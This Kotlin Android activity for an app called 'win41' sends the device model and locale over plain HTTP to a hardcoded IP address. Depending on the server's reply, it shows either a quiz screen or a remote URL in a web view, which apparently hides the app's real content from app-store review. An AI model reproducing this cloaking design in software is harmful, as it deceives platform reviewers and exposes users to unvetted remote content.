package com.example.win41

import android.Manifest
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.RequiresApi
import androidx.compose.foundation.Image
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.Button
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.MutableState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.tooling.preview.Preview
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import coil.compose.rememberAsyncImagePainter
import com.example.win41.model.PostModel
import com.example.win41.services.RetrofitInterface
import com.example.win41.ui.theme.Win41Theme
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.UUID

class MainActivity : ComponentActivity() {

    var device: String = ""
    var locale: String = ""
    var id: String = ""
    lateinit var url: MutableState<String>
    lateinit var currentUrl: String

    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        device = Build.MANUFACTURER + Build.MODEL
        locale = resources.configuration.locales.get(0).toString()
        id = UUID.randomUUID().toString()
        CoroutineScope(Dispatchers.IO).launch {
            val retrofit = Retrofit.Builder()
                .baseUrl("http://49.12.202.175/")
                .addConverterFactory(GsonConverterFactory.create())
                .build()
            val response = retrofit.create(RetrofitInterface::class.java)
            launch(Dispatchers.Main) {
                currentUrl = response.postQuery(
                    PostModel(
                        device,
                        locale,
                        id
                    )
                ).body()?.url.toString()
                setContent {
                    url = remember {
                        mutableStateOf("")
                    }
                    url.value = currentUrl
                    Image(
                        painter = rememberAsyncImagePainter("http://49.12.202.175/win41/gradient.png"),
                        contentDescription = null,
                        modifier = Modifier.fillMaxSize(),
                        contentScale = ContentScale.FillBounds
                    )
                    val context = LocalContext.current
                    var hasNotificationPermission by remember {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                            mutableStateOf(
                                ContextCompat.checkSelfPermission(
                                    context,
                                    Manifest.permission.POST_NOTIFICATIONS
                                ) == PackageManager.PERMISSION_GRANTED
                            )
                        } else mutableStateOf(true)
                    }
                    val launcher = rememberLauncherForActivityResult(
                        contract = ActivityResultContracts.RequestPermission(),
                        onResult = { isGranted ->
                            hasNotificationPermission = isGranted
                            checkUrl()
                        }
                    )
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        LaunchedEffect(key1 = "key") {
                            launcher.launch(Manifest.permission.POST_NOTIFICATIONS)
                        }
                    }
                }
            }
        }

    }

    private fun checkUrl(){
        Log.i("URLL", url.value)
        when (url.value) {
            "no" -> {
                val intent = Intent(this@MainActivity, QuizActivity::class.java)
                intent.putExtra("url", url.value)
                startActivity(intent)
            }
            "nopush" -> {
                val intent = Intent(this@MainActivity, QuizActivity::class.java)
                intent.putExtra("url", url.value)
                startActivity(intent)
            }
            ""->{}
            else -> {
                val intent = Intent(this@MainActivity, ActivityWeb::class.java)
                intent.putExtra("url", url.value)
                startActivity(intent)
            }
        }
    }
    private fun loadUrl() {
        CoroutineScope(Dispatchers.IO).launch {
            val retrofit = Retrofit.Builder()
                .baseUrl("http://49.12.202.175/")
                .addConverterFactory(GsonConverterFactory.create())
                .build()
            val response = retrofit.create(RetrofitInterface::class.java)
            launch(Dispatchers.Main) {
                url.value = response.postQuery(
                    PostModel(
                        device,
                        locale,
                        id
                    )
                ).body()?.url.toString()
                checkUrl()
            }
        }
    }
}